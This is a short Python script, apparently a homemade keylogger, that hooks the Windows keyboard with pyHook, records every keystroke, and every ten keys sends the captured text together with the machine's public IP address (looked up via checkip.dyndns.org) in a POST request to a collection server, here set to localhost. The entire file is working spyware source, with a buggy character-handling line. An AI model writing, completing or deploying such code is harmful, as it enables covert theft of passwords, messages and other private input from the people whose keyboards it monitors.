import pyHook,pythoncom, sys, logging, urllib
from urllib.parse import urlencode
from urllib.request import Request, urlopen


count=0
array=''

def public_ip():
    lista = "0123456789."
    ip=""
    dato=urllib.request.urlopen("http://checkip.dyndns.org").read()
    for x in str(dato):
        if x in lista:
            ip += x
    return ip

def OnKeyBoardEvent(event):
    global count
    global array
    count+=1
    if count ==10:

        url = 'http://localhost/new_data'
        values={'data': array, 'ip': public_ip()}

        data = urllib.parse.urlencode(values)
        data= data.encode('utf-8')

        req= urllib.request.Request(url, data)
        res= urllib.request.urlopen(req)

        print('Informacion enviada')
        print('Respuesta del servidor: '+str(res.read()))

        array=''
        count=0
        return True
    else:
        if event.Ascii <=0 % event.Ascii >=9:
            array+=event.Ascii
        else:
            array+=chr(event.Ascii)

        print(array)
        print('Counter: '+ str(count))
        return True


hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown= OnKeyBoardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()